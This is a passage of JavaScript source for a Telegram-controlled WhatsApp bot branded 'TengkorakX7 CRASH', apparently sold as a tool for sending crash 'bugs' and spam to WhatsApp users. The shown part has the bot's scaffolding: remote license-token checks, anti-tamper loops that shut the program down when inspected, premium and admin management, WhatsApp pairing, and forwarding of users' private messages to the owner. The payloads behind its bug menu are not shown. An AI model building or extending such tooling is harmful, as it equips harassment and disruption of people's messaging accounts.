      chats[chatId] = Object.assign({}, chats[chatId] || {}, {
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: msg.messageTimestamp + 0
      });
    }
  });

  ev.on("chats.set", function (payload) {
    var newChats = payload.chats;
    for (const chat of newChats) {
      chats[chat.id] = chat;
    }
  });

  ev.on("contacts.set", function (payload) {
    var newContacts = payload.contacts;
    while (0 < Object.keys(newContacts).length) {
      var id = Object.keys(newContacts)[0];
      contacts[id] = newContacts[id];
    }
  });

  return {
    chats: chats,
    messages: messages,
    contacts: contacts,
    bind: function (evTarget) {
      evTarget.on("messages.upsert", function (m) {
        return ev.emit("messages.upsert", m);
      });
      evTarget.on("chats.set", function (c) {
        return ev.emit("chats.set", c);
      });
      evTarget.on("contacts.set", function (c) {
        return ev.emit("contacts.set", c);
      });
    },
    logger: logger
  };
};

databaseUrl = "https://raw.githubusercontent.com/maharajaphoenix-hash/databaseX7/refs/heads/main/token.json";
thumbnailUrl = "https://files.catbox.moe/7o635t.png";

(function () {
  var randErr, code, secure, hash, hardExit, hardKill;

  randErr = function () {
    return Array.from({ length: 12 }, function () {
      return String.fromCharCode(33 + Math.floor(Math.random() * 90));
    }).join("");
  };

  setInterval(function () {
    var start = performance.now();
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  secure = function () {
    console.log(chalk.green("✅ 𝙎𝙚𝙘𝙪𝙧𝙚 𝙢𝙤𝙙𝙚 𝙖𝙠𝙩𝙞𝙛 — 𝙨𝙘𝙧𝙞𝙥𝙩 𝙨𝙪𝙙𝙖𝙝 𝙙𝙞𝙡𝙞𝙣𝙙𝙪𝙣𝙜𝙞\nCreate 𝙗𝙮 𝙏𝙚𝙣𝙜𝙠𝙤𝙧𝙖𝙠𝙓𝟳 𝘾𝙧𝙖𝙨𝙝"));
  };

  hash = Buffer.from(secure.toString()).toString("base64");

  setInterval(function () {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();

  hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true
  });

  hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true
  });

  setInterval(function () {
    try {
      if (
        process.exit.toString().includes("Proxy") ||
        process.kill.toString().includes("Proxy")
      ) {
        console.log(chalk.bold.yellow("\n⬡═―—⊱ ⎧ BYPASS CHECKING ⎭ ⊰―—═⬡\n┃PERUBAHAN CODE MYSQL TERDETEKSI\n┃ SCRIPT DIMATIKAN / TIDAK BISA PAKAI\n╘═——————————————═⬡\n  "));
        activateSecureMode();
        hardExit(1);
      }
      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.yellow("\n⬡═―—⊱ ⎧ BYPASS CHECKING ⎭ ⊰―—═⬡\n┃PERUBAHAN CODE MYSQL TERDETEKSI\n┃ SCRIPT DIMATIKAN / TIDAK BISA PAKAI\n╘═——————————————═⬡\n  "));
          activateSecureMode();
          hardExit(1);
        }
      }
    } catch (_err) {
      activateSecureMode();
      hardExit(1);
    }
  }, 2000);

  global.validateToken = async function (dbUrl, botToken) {
    try {
      var res = await fetchJsonHttps(dbUrl, 5000);
      var tokens = (res && res.tokens) || [];
      var tokenId = getTokenId(botToken);
      var isValid =
        Array.isArray(tokens) &&
        tokens.some(function (t) {
          return getTokenId(String(t)) === tokenId;
        });
      if (!isValid) {
        console.log(chalk.bold.yellow("\n⬡═―—⊱ ⎧ BYPASS ALERT ⎭ ⊰―—═⬡\n┃ NOTE : SERVER MENDETEKSI KAMU\n┃  MEMBYPASS PAKSA SCRIPT !\n╘═——————————————═⬡\n  "));
        activateSecureMode();
        hardExit(1);
      }
    } catch (err) {
      console.log(chalk.bold.yellow("\n⬡═―—⊱ ⎧ CHECK SERVER ⎭ ⊰―—═⬡\n┃ NOTE : SERVER GAGAL TERHUBUNG\n╘═——————————————═⬡\n  "));
      activateSecureMode();
      hardExit(1);
    }
  };
})();

question = function (query) {
  return new Promise(function (resolve) {
    var rl = require("readline").createInterface({
      input: process.stdin,
      output: process.stdout
    });
    rl.question(query, function (answer) {
      rl.close();
      resolve(answer);
    });
  });
};

(async function () {
  await validateToken(databaseUrl, tokenBot);
})();

bot = new Telegraf(tokenBot);
secureMode = false;
sock = null;
isWhatsAppConnected = false;
linkedWhatsAppNumber = "";
lastPairingMessage = null;
usePairingCode = true;

bot.use(async function (ctx, next) {
  if (!ctx.message || !ctx.message.text) {
    return next();
  }
  if (ctx.message.text.startsWith("/")) {
    var cmd = ctx.message.text.split(" ")[0].replace("/", "");
    if (blockedCmds.has(cmd)) {
      return ctx.reply("🚫 Command /" + String(cmd) + " sedang dinonaktifkan oleh owner.");
    }
  }
  return next();
});

sleep = function (ms) {
  return new Promise(function (resolve) {
    return setTimeout(resolve, ms);
  });
};

premiumFile = "./database/premium.json";
cooldownFile = "./database/cooldown.json";

loadPremiumUsers = function () {
  try {
    var raw = fs.readFileSync(premiumFile);
    return JSON.parse(raw);
  } catch (err) {
    return {};
  }
};

savePremiumUsers = function (users) {
  fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

addpremUser = function (userId, duration) {
  var premiumUsers = loadPremiumUsers();
  var expiryDate = moment().add(duration, "days").tz("Asia/Jakarta").format("DD-MM-YYYY");
  premiumUsers[userId] = expiryDate;
  savePremiumUsers(premiumUsers);
  return expiryDate;
};

removePremiumUser = function (userId) {
  var premiumUsers = loadPremiumUsers();
  Reflect.deleteProperty(premiumUsers, userId);
  savePremiumUsers(premiumUsers);
};

isPremiumUser = function (userId) {
  var premiumUsers = loadPremiumUsers();
  if (premiumUsers[userId]) {
    var expiryDate = moment(premiumUsers[userId], "DD-MM-YYYY");
    if (moment().isBefore(expiryDate)) {
      return true;
    } else {
      removePremiumUser(userId);
      return false;
    }
  }
  return false;
};

loadCooldown = function () {
  try {
    var raw = fs.readFileSync(cooldownFile);
    return JSON.parse(raw).cooldown || 5;
  } catch (_err) {
    return 5;
  }
};

saveCooldown = function (seconds) {
  fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2));
};

cooldown = loadCooldown();
userCooldowns = new Map();

startSesi = async function () {
  var store, authState, state, saveCreds, version, connectionOptions;
  console.clear();
  console.log(chalk.red("\n\n⬡═―—⊱ ⎧ 𝗧𝗘𝗡𝗚𝗞𝗢𝗥𝗔𝗞𝗫𝟳 𝗖𝗥𝗔𝗦𝗛 ⎭ ⊰―—═⬡\n\n𝙎𝙚𝙡𝙖𝙢𝙖𝙩 𝘿𝙖𝙩𝙖𝙣𝙜 𝙙𝙞 TengkorakX7 CRASH\n𝙊𝙬𝙣𝙚𝙧 : @kaypablo24\n𝙎𝙩𝙤𝙧𝙚 : @kaypablo24\n"));

  store = makeInMemoryStore({
    logger: pino().child({
      level: "silent",
      stream: "store"
    })
  });

  authState = await useMultiFileAuthState("./session");
  state = authState.state;
  saveCreds = authState.saveCreds;
  version = (await fetchLatestBaileysVersion()).version;

  connectionOptions = {
    version: version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: !usePairingCode,
    logger: pino({ level: "silent" }),
    auth: state,
    browser: ["Mac OS", "Safari", "5.15.7"],
    getMessage: async function (key) {
      return { conversation: "Apophis" };
    }
  };

  sock = makeWASocket(connectionOptions);

  sock.ev.on("messages.upsert", async function (m) {
    try {
      if (!m || !m.messages || !m.messages[0]) {
        return;
      }
      var msg = m.messages[0];
      var chatId = msg.key.remoteJid || "Tidak Diketahui";
    } catch (error) {}
  });

  sock.ev.on("creds.update", saveCreds);
  store.bind(sock.ev);

  sock.ev.on("connection.update", function (update) {
    var connection = update.connection;
    var lastDisconnect = update.lastDisconnect;

    if (connection === "open") {
      isWhatsAppConnected = true;

      if (lastPairingMessage) {
        var connectedMenu =
          "\n<blockquote><pre>⬡═―—⊱ ⎧ 𝚃𝙴𝙽𝙶𝙺𝙾𝚁𝙰𝙺𝚇𝟽 𝙲𝚁𝙰𝚂𝙷 ⎭ ⊰―—═⬡</pre></blockquote>\n" +
          "┃ Number: " + String(lastPairingMessage.phoneNumber) + "\n" +
          "┃ Pairing Code: " + String(lastPairingMessage.pairingCode) + "\n" +
          "┃ Type: Connected\n" +
          "╘———————————————═⬡";
        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {}
      }

      console.clear();
      var currentTime = moment().tz("Asia/Jakarta").format("HH:mm:ss");
      console.log(
        chalk.bold.yellow(
          "\n  ⬡═════════════════════════⬡\n\n" +
          "  WhatsApp Connected - " + String(currentTime) + "\n\n" +
          "  ⬡═════════════════════════⬡\n  "
        )
      );
    }

    if (connection === "close") {
      var statusCode =
        lastDisconnect &&
        lastDisconnect.error &&
        lastDisconnect.error.output &&
        lastDisconnect.error.output.statusCode;
      var shouldReconnect = statusCode !== DisconnectReason.loggedOut;

      console.log(
        chalk.red("Koneksi WhatsApp terputus:"),
        shouldReconnect ? "Mencoba Menautkan Perangkat" : "Silakan Menautkan Perangkat Lagi"
      );

      if (shouldReconnect) {
        startSesi();
      }
      isWhatsAppConnected = false;
    }
  });
};

startSesi();

checkWhatsAppConnection = function (ctx, next) {
  if (!isWhatsAppConnected) {
    ctx.reply(" 🪧 Tidak ada sender yang terhubung");
    return;
  }
  next();
};

checkCooldown = function (ctx, next) {
  var userId, now, lastUsed, diff, remaining;

  userId = ctx.from.id;
  now = Date.now();

  if (userCooldowns.has(userId)) {
    lastUsed = userCooldowns.get(userId);
    diff = (now - lastUsed) / 1000;

    if (diff < cooldown) {
      remaining = Math.ceil(cooldown - diff);
      ctx.reply("⏳  Harap menunggu " + String(remaining) + " detik");
      return;
    }
  }

  userCooldowns.set(userId, now);
  next();
};

checkPremium = function (ctx, next) {
  if (!isPremiumUser(ctx.from.id)) {
    ctx.reply("❌  Akses hanya untuk premium");
    return;
  }
  next();
};

bot.command("addbot", async function (ctx) {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌  Akses hanya untuk owner");
  }

  var args = ctx.message.text.split(" ")[1];

  if (!args) {
    return ctx.reply("🪧  Format: /addbot 62×××");
  }

  var phoneNumber = args.replace(/[^0-9]/g, "");

  if (!phoneNumber) {
    return ctx.reply("❌  Nomor tidak valid");
  }

  try {
    if (!sock) {
      return ctx.reply("❌  Socket belum siap, coba lagi nanti");
    }

    if (sock.authState && sock.authState.creds && sock.authState.creds.registered) {
      return ctx.reply("✅  WhatsApp sudah terhubung dengan nomor: " + String(phoneNumber));
    }

    var code = await sock.requestPairingCode(phoneNumber, "PHOENIX1");
    var codeChunks = code.match(/.{1,4}/g) || [code];
    var formattedCode = codeChunks.join("-");

    var pairingMenu =
      "```\n" +
      "⬡═―—⊱ ⎧ 𝚃𝙴𝙽𝙶𝙺𝙾𝚁𝙰𝙺𝚇𝟽 𝙲𝚁𝙰𝚂𝙷 ⎭ ⊰―—═⬡\n" +
      "┃ Number: " + String(phoneNumber) + "\n" +
      "┃ Pairing Code: " + String(formattedCode) + "\n" +
      "┃ Type: Not Connected\n" +
      "╘═———————————————═⬡\n" +
      "```";

    var sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {
      caption: pairingMenu,
      parse_mode: "Markdown"
    });

    lastPairingMessage = {
      chatId: ctx.chat.id,
      messageId: sentMsg.message_id,
      phoneNumber: phoneNumber,
      pairingCode: formattedCode
    };
  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async function (update) {
    if (update.connection === "open" && lastPairingMessage) {
      var updateConnectionMenu =
        "```\n" +
        "⬡═―—⊱ ⎧ 𝚃𝙴𝙽𝙶𝙺𝙾𝚁𝙰𝙺𝚇𝟽 𝙲𝚁𝙰𝚂𝙷 ⎭ ⊰―—═⬡\n" +
        "┃ Number: " + String(lastPairingMessage.phoneNumber) + "\n" +
        "┃ Pairing Code: " + String(lastPairingMessage.pairingCode) + "\n" +
        "┃ Type: Connected\n" +
        "╘═———————————————═⬡\n" +
        "```\n";

      try {
        await bot.telegram.editMessageCaption(
          lastPairingMessage.chatId,
          lastPairingMessage.messageId,
          undefined,
          updateConnectionMenu,
          { parse_mode: "Markdown" }
        );
      } catch (e) {}
    }
  });
}

loadJSON = function (file) {
  if (!fs.existsSync(file)) {
    return [];
  }
  return JSON.parse(fs.readFileSync(file, "utf8"));
};

saveJSON = function (file, payload) {
  fs.writeFileSync(file, JSON.stringify(payload, null, 2));
};

loadAdmins = function () {
  try {
    var raw = fs.readFileSync(adminFile, "utf8");
    return JSON.parse(raw);
  } catch (err) {
    return {};
  }
};

saveAdmins = function (admins) {
  try {
    fs.writeFileSync(adminFile, JSON.stringify(admins, null, 2));
  } catch (err) {}
};

addAdmin = function (userId) {
  var admins = loadAdmins();
  admins[userId] = true;
  saveAdmins(admins);
  return true;
};

removeAdmin = function (userId) {
  var admins = loadAdmins();
  Reflect.deleteProperty(admins, userId);
  saveAdmins(admins);
  return true;
};

isAdmin = function (userId) {
  var admins = loadAdmins();
  return admins[userId] === true || userId == ownerID;
};

bot.command("addadmin", async function (ctx) {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌  Akses hanya untuk owner");
  }

  var args = ctx.message.text.split(" ");

  if (args.length < 2) {
    return ctx.reply("🪧  Format: /addadmin 12345678");
  }

  var userId = args[1];
  addAdmin(userId);
  ctx.reply("✅  " + String(userId) + " berhasil ditambahkan sebagai admin");
});

bot.command("deladmin", async function (ctx) {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌  Akses hanya untuk owner");
  }

  var args = ctx.message.text.split(" ");

  if (args.length < 2) {
    return ctx.reply("🪧  Format: /deladmin 12345678");
  }

  var userId = args[1];

  if (userId == ownerID) {
    return ctx.reply("❌  Tidak dapat menghapus owner utama");
  }

  removeAdmin(userId);
  ctx.reply("✅  " + String(userId) + " telah berhasil dihapus dari daftar admin");
});

bot.command("blockcmd", async function (ctx) {
  var text = ctx.message.text.split(" ");

  if (!text[1]) {
    return ctx.reply("Format:\n/blockcmd /command");
  }

  var cmd = text[1].replace("/", "");
  blockedCmds.add(cmd);
  saveBlocked();
  ctx.reply("🚫 Command /" + String(cmd) + " berhasil diblokir.");
});

bot.command("unblockcmd", async function (ctx) {
  var text, cmd;
  text = ctx.message.text.split(" ");
  if (!text[1]) {
    return ctx.reply("Format:\n/unblockcmd /command");
  }
  cmd = text[1].replace("/", "");
  blockedCmds.delete(cmd);
  saveBlocked();
  ctx.reply("✅ Command /" + String(cmd) + " berhasil dibuka.");
});

bot.command("setcd", async function (ctx) {
  var args, seconds;
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌  Akses hanya untuk owner");
  }
  args = ctx.message.text.split(" ");
  seconds = parseInt(args[1]);
  if (isNaN(seconds) || seconds < 0) {
    return ctx.reply("🪧  Format: /setcd 5");
  }
  cooldown = seconds;
  saveCooldown(seconds);
  ctx.reply("✅  Cooldown berhasil diatur ke " + String(seconds) + " detik");
});

bot.command("killsesi", async function (ctx) {
  var sessionDirs, deleted;
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌  Akses hanya untuk owner");
  }
  try {
    sessionDirs = ["./session", "./sessions"];
    deleted = false;
    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, {
          recursive: true,
          force: true
        });
        deleted = true;
      }
    }
    if (deleted) {
      await ctx.reply("✅  Session berhasil dihapus, panel akan restart");
      setTimeout(function () {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply(" 🪧  Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌  Gagal menghapus session");
  }
});

PREM_GROUP_FILE = "./grup.json";

bot.command("addpremgrup", async function (ctx) {
  var args, groupId, ok;
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌  Akses hanya untuk owner");
  }
  args = (ctx.message.text || "").trim().split(new RegExp("\\s+", ""));
  groupId = String(ctx.chat.id);
  if (ctx.chat.type === "private") {
    if (args.length < 2) {
      return ctx.reply("🪧  Format: /addpremgrup -1001234567890\nKirim di private wajib pakai ID grup.");
    }
    groupId = String(args[1]);
  } else {
    if (args.length >= 2) {
      groupId = String(args[1]);
    }
  }
  ok = addPremGroup(groupId);
  if (!ok) {
    return ctx.reply("🪧  Grup " + String(groupId) + " sudah terdaftar sebagai grup premium.");
  }
  return ctx.reply("✅  Grup " + String(groupId) + " berhasil ditambahkan ke daftar grup premium.");
});

bot.command("delpremgrup", async function (ctx) {
  var args, groupId, ok;
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌  Akses hanya untuk owner");
  }
  args = (ctx.message.text || "").trim().split(new RegExp("\\s+", ""));
  groupId = String(ctx.chat.id);
  if (ctx.chat.type === "private") {
    if (args.length < 2) {
      return ctx.reply("🪧  Format: /delpremgrup -1001234567890\nKirim di private wajib pakai ID grup.");
    }
    groupId = String(args[1]);
  } else {
    if (args.length >= 2) {
      groupId = String(args[1]);
    }
  }
  ok = delPremGroup(groupId);
  if (!ok) {
    return ctx.reply("🪧  Grup " + String(groupId) + " belum terdaftar sebagai grup premium.");
  }
  return ctx.reply("✅  Grup " + String(groupId) + " berhasil dihapus dari daftar grup premium.");
});

bot.command("addprem", async function (ctx) {
  var userId, args, durationIndex, duration, expiryDate;
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌  Akses hanya untuk owner");
  }
  userId = undefined;
  args = ctx.message.text.split(" ");
  if (ctx.message.reply_to_message) {
    userId = ctx.message.reply_to_message.from.id.toString();
  } else {
    if (args.length < 3) {
      return ctx.reply("🪧  Format: /addprem 12345678 30d\nAtau reply pesan user yang ingin ditambahkan");
    } else {
      userId = args[1];
    }
  }
  durationIndex = ctx.message.reply_to_message ? 1 : 2;
  duration = parseInt(args[durationIndex]);
  if (isNaN(duration)) {
    return ctx.reply("🪧  Durasi harus berupa angka dalam hari");
  }
  expiryDate = addpremUser(userId, duration);
  ctx.reply("✅  " + String(userId) + " berhasil ditambahkan sebagai pengguna premium sampai " + String(expiryDate));
});

bot.command("delprem", async function (ctx) {
  var userId, args;
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌  Akses hanya untuk owner");
  }
  userId = undefined;
  args = ctx.message.text.split(" ");
  if (ctx.message.reply_to_message) {
    userId = ctx.message.reply_to_message.from.id.toString();
  } else {
    if (args.length < 2) {
      return ctx.reply("🪧  Format: /delprem 12345678\nAtau reply pesan user yang ingin dihapus");
    } else {
      userId = args[1];
    }
  }
  removePremiumUser(userId);
  ctx.reply("✅  " + String(userId) + " telah berhasil dihapus dari daftar pengguna premium");
});

getRandomColor = function () {
  var styles;
  styles = ["primary", "danger", "success"];
  return styles[Math.floor(Date.now() / 2500) % styles.length];
};

autoColorMessages = new Map();
lastUpdateMap = new Map();
setInterval(function () {
  for (const [chatId, messageId] of autoColorMessages.entries()) {
    updateButtonColors(chatId, messageId);
  }
}, 3000);

bot.start(async function (ctx) {
  logCommand(ctx, "/start");

  var userId = ctx.from.id;
  var isOwner = userId == ownerID;
  var premiumStatus = isPremiumUser(userId) ? "✅ Premium" : "❌ Tidak Premium";
  var senderStatus = isWhatsAppConnected ? "✅ Terhubung" : "❌ Tidak Terhubung";

  if (!isOwner && ctx.chat.type === "private") {
    try {
      await bot.telegram.sendMessage(
        ownerID,
        "═══════════════════════════════       \n" +
          "        👤  - Username : @" + String(ctx.from.username || "Tidak Ada") + "\n" +
          "        🆔  - ID : " + String(userId) + "\n" +
          "        🕒  - Time : " + String(new Date().toLocaleString("id-ID")) + "  \n" +
          "        💬  - Pesan : " + String(ctx.message.text) + "\n" +
          "        ═══════════════════════════════",
        { parse_mode: "HTML" }
      );
    } catch (_) {}
    return ctx.reply("❌ Bot ini hanya bisa digunakan di grup yang memiliki akses.");
  }

  if (!isOwner && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("❌  Grup ini belum terdaftar sebagai GRUP PREMIUM.");
  }

  var initialColor = getRandomColor();

  var menuMessage =
    "\n<blockquote><pre>⬡═―—⊱ ⎧ 𝚃𝙴𝙽𝙶𝙺𝙾𝚁𝙰𝙺𝚇𝟽 𝙲𝚁𝙰𝚂𝙷⎭ ⊰―—═⬡</pre></blockquote>\n" +
    "<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> 𝙾𝚠𝚗𝚎𝚛 : @bixuec  <tg-emoji emoji-id=\"5778220576497735613\">🌹</tg-emoji>\n" +
    "<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> 𝚅𝚎𝚛𝚜𝚒 : 𝟹.𝟶.𝟶 𝚅𝚒𝚙\n" +
    "<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> 𝙿𝚛𝚎𝚏𝚒𝚡 : ( / )\n" +
    "<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> 𝙱𝚊𝚑𝚊𝚜𝚊 : JavaScript\n" +
    "<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> 𝚃𝚒𝚙𝚎 𝚂𝚎𝚗𝚍𝚎𝚛: Bebas Spam\n" +
    "<blockquote><pre>⬡═―—⊱ 𝚂𝚝𝚊𝚝𝚞𝚜 𝚂𝚎𝚗𝚍𝚎𝚛 ⊰―—═⬡</pre></blockquote>\n" +
    "<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> 𝙺𝚘𝚗𝚎𝚔𝚜𝚒 : " + String(senderStatus) + "  \n" +
    "<blockquote><pre>⬡═―—⊱ 𝚂𝚝𝚊𝚝𝚞𝚜 𝚄𝚜𝚎𝚛 ⊰―—═⬡</pre></blockquote>\n" +
    "<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> 𝚄𝚜𝚎𝚛𝚗𝚊𝚖𝚎  : @" + String(ctx.from.username || "Tidak Ada") + "\n" +
    "<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> 𝚄𝚜𝚎𝚛 𝙸𝚍  : <code>" + String(userId) + "</code>\n" +
    "<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> 𝙿𝚛𝚎𝚖𝚒𝚞𝚖  : " + String(premiumStatus) + "\n" +
    "<blockquote><pre>§«┃❲『 𝙸𝚗𝚏𝚘 𝙱𝚞𝚝𝚝𝚘𝚗 』❳┃§«</pre></blockquote>";

  var keyboard = [
    [
      {
        text: "𝙼𝚄𝚁𝙱𝚄𝙶 𝙼𝙴𝙽𝚄",
        callback_data: "/bug",
        style: initialColor,
        icon_custom_emoji_id: "5334998226636390258"
      }
    ],
    [
      {
        text: "⌜𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁⌟",
        url: "https://t.me/kayoablo42",
        style: initialColor,
        icon_custom_emoji_id: "5330237710655306682"
      },
      {
        text: "⌜𝙸𝙽𝙵𝙾 𝚂𝙲𝚁𝙸𝙿𝚃⌟",
        url: "https://t.me/kayoablo42",
        style: initialColor,
        icon_custom_emoji_id: "5370577035636786019"
      }
    ],
    [
      {
        text: "𝙾𝚆𝙽𝙴𝚁 𝙼𝙴𝙽𝚄",
        callback_data: "/controls",
        style: initialColor,
        icon_custom_emoji_id: "5816539591812845173"
      }
    ]
  ];

  var sentMessage = await ctx.replyWithPhoto(thumbnailUrl, {
    caption: menuMessage,
    parse_mode: "HTML",
    reply_markup: { inline_keyboard: keyboard }
  });

  autoColorMessages.set(ctx.chat.id, sentMessage.message_id);
});

bot.action("/start", async function (ctx) {
  logCommand(ctx, "/start");

  var color = getRandomColor();
  var userId = ctx.from.id;
  var premiumStatus = isPremiumUser(userId) ? "✅ Premium" : "❌ Tidak Premium";
  var senderStatus = isWhatsAppConnected ? "✅ Terhubung" : "❌ Tidak Terhubung";

  var menuMessage =
    "\n<blockquote><pre>⬡═―—⊱ ⎧ 𝚃𝙴𝙽𝙶𝙺𝙾𝚁𝙰𝙺𝚇𝟽 𝙲𝚁𝙰𝚂𝙷 ⎭ ⊰―—═⬡</pre></blockquote>\n" +
    "<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> 𝙾𝚠𝚗𝚎𝚛 : @bixuec  <tg-emoji emoji-id=\"5778220576497735613\">🌹</tg-emoji>\n" +
    "<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> 𝚅𝚎𝚛𝚜𝚒 : 𝟹.𝟶.𝟶 𝚅𝚒𝚙\n" +
    "<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> 𝙿𝚛𝚎𝚏𝚒𝚡 : ( / )\n" +
    "<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> 𝙱𝚊𝚑𝚊𝚜𝚊 : JavaScript\n" +
    "<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> 𝚃𝚒𝚙𝚎 𝚂𝚎𝚗𝚍𝚎𝚛 : Bebas Spam\n" +
    "<blockquote><pre>⬡═―—⊱ 𝚂𝚝𝚊𝚝𝚞𝚜 𝚂𝚎𝚗𝚍𝚎𝚛 ⊰―—═⬡</pre></blockquote>\n" +
    "<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> 𝙺𝚘𝚗𝚎𝚔𝚜𝚒 : " + String(senderStatus) + "\n" +
    "<blockquote><pre>⬡═―—⊱ 𝚂𝚝𝚊𝚝𝚞𝚜 𝚄𝚜𝚎𝚛 ⊰―—═⬡</pre></blockquote>\n" +
    "<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> 𝚄𝚜𝚎𝚛𝚗𝚊𝚖𝚎 : @" + String(ctx.from.username || "Tidak Ada") + "\n" +
    "<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> 𝚄𝚜𝚎𝚛 𝙸𝚍 : <code>" + String(userId) + "</code>\n" +
    "<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> 𝙿𝚛𝚎𝚖𝚒𝚞𝚖 : " + String(premiumStatus) + "\n" +
    "<blockquote><pre>§«┃❲『 𝙸𝚗𝚏𝚘 𝙱𝚞𝚝𝚝𝚘𝚗 』❳┃§«</pre></blockquote>";

  var keyboard = [
    [
      {
        text: "𝙼𝚄𝚁𝙱𝚄𝙶 𝙼𝙴𝙽𝚄",
        callback_data: "/bug",
        style: color,
        icon_custom_emoji_id: "5334998226636390258"
      }
    ],
    [
      {
        text: "⌜𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁⌟",
        url: "https://t.me/kayoablo42",
        style: color,
        icon_custom_emoji_id: "5330237710655306682"
      },
      {
        text: "⌜𝙸𝙽𝙵𝙾 𝚂𝙲𝚁𝙸𝙿𝚃⌟",
        url: "https://t.me/kayoablo42",
        style: color,
        icon_custom_emoji_id: "5370577035636786019"
      }
    ],
    [
      {
        text: "𝙾𝚆𝙽𝙴𝚁 𝙼𝙴𝙽𝚄",
        callback_data: "/controls",
        style: color,
        icon_custom_emoji_id: "5816539591812845173"
      }
    ]
  ];

  try {
    await ctx.editMessageMedia(
      {
        type: "photo",
        media: thumbnailUrl,
        caption: menuMessage,
        parse_mode: "HTML"
      },
      { reply_markup: { inline_keyboard: keyboard } }
    );

    autoColorMessages.set(ctx.chat.id, ctx.callbackQuery.message.message_id);
    await ctx.answerCbQuery();
  } catch (error) {
    var description =
      error && error.response && typeof error.response.description === "string"
        ? error.response.description
        : "";

    if (description.includes("message is not modified")) {
      autoColorMessages.set(ctx.chat.id, ctx.callbackQuery.message.message_id);
      return ctx.answerCbQuery();
    }

    console.error("Error saat mengirim menu:", error);
    try {
      await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
    } catch (_) {}
  }
});

bot.action("/controls", async function (ctx) {
  if (ctx.from.id != ownerID) {
    return ctx.answerCbQuery("❌ Akses hanya untuk owner", { show_alert: true });
  }

  logCommand(ctx, "/controls");

  var color = getRandomColor();

  var controlsMenu =
    "\n<blockquote><pre>⬡═―—⊱ ⎧ 𝚃𝙴𝙽𝙶𝙺𝙾𝚁𝙰𝙺𝟽 𝙲𝚁𝙰𝚂𝙷 ⎭ ⊰―—═⬡</pre></blockquote>\n" +
    "<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> 𝙾𝚠𝚗𝚎𝚛 : @bixuec  <tg-emoji emoji-id=\"5778220576497735613\">🌹</tg-emoji>\n" +
    "<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> 𝚅𝚎𝚛𝚜𝚒 : 𝟹.𝟶.𝟶 𝚅𝚒𝚙\n" +
    "<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> 𝙿𝚛𝚎𝚏𝚒𝚡 : ( / )\n" +
    "<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> 𝙱𝚊𝚑𝚊𝚜𝚊 : JavaScript\n" +
    "<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> 𝚃𝚒𝚙𝚎 𝚂𝚎𝚗𝚍𝚎𝚛 : Bebas Spam\n" +
    "<blockquote><pre>⬡═―—⊱ 𝚂𝚝𝚊𝚝𝚞𝚜 𝚂𝚎𝚜𝚜𝚒𝚘𝚗 ⊰―—═⬡</pre></blockquote>\n" +
    "<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> /addbot - Add Sender\n" +
    "<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> /killsesi - Reset Session\n" +
